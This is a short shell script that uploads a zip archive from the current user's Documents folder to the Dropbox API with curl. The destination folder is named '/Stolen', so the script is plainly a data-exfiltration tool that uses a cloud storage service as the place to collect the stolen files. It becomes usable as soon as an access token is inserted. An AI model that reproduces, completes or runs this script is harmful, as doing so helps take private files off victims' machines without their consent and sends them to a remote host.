#!/bin/sh

# Set the access token for Dropbox API
ACCESS_TOKEN=""

# User name
NAME=$(whoami)

# Set the file path and name
FILE_PATH="/home/$NAME/Documents/files.zip"
FILE_NAME="files.zip"

# Set the Dropbox folder path
DROPBOX_FOLDER="/Stolen"

# Upload the file to Dropbox
curl -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer $ACCESS_TOKEN" \
    --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER/$FILE_NAME\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" \
    --header "Content-Type: application/octet-stream" \
    --data-binary "@$FILE_PATH"
